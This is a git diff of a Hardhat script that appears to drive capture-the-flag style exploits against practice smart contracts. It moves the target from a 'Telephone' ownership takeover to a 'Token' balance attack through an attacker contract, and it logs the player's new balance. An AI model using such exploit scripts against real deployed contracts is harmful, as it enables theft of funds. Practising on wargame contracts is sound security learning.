@@ -1,12 +1,12 @@
 import { ethers } from "hardhat";
-
-const CONTRACT_ADDRESS = "0x290665897E441317ec52b664B1a6e6601d6312F5";
+const CONTRACT_ADDRESS = "0xa855A0060156c3D3567423b4D9aCFfA4b7Ab8F3d";
 const PLAYER_ADDRESS = "0x81215d34367AF48d01E728AfF2976d9Df32fE604";
-const ATTACKER_CONTRACT = "0xb524bF75fe2e6C31740a77E31a84fDb1a9AADb9D";
+const ATTACKER_CONTRACT = "0x69e3b78Ba361367FFbF06C1a9dAE1C3c0a86B2a8";
+
 async function main() {
   const signer = await ethers.getSigner(PLAYER_ADDRESS);
   const contract = await ethers.getContractAt(
-    "Telephone",
+    "Token",
     CONTRACT_ADDRESS,
     signer
   );
@@ -17,18 +17,15 @@ async function main() {
     signer
   );
 
-  let contractOwner = await contract.owner();
-  console.log(`The current contract owner is: ${contractOwner}`);
-
-  // sign a transaction with my private key that sends data to the attacker contract
   console.log(
-    `Lets call the attacker message to send a changeOwner message: ${await attackerContract.sendAttackerMessage(
-      PLAYER_ADDRESS // the data will be to call the sendAtttackerMessage() function with my public key passed in a parameter
+    `sending an attack message ${await attackerContract.sendAttackMessage()}`
+  );
+
+  console.log(
+    `The new balance of the player address is: ${await contract.balanceOf(
+      PLAYER_ADDRESS
     )}`
   );
-  // The sendAttackerMessage() will then call the Telephone contract’s changeOwner function with my public key as the new address.
-  let contractNewOwner = await contract.owner();
-  console.log(`The newly passed contract owner is: ${contractNewOwner} `);
 }
 
 // We recommend this pattern to be able to use async/await everywhere
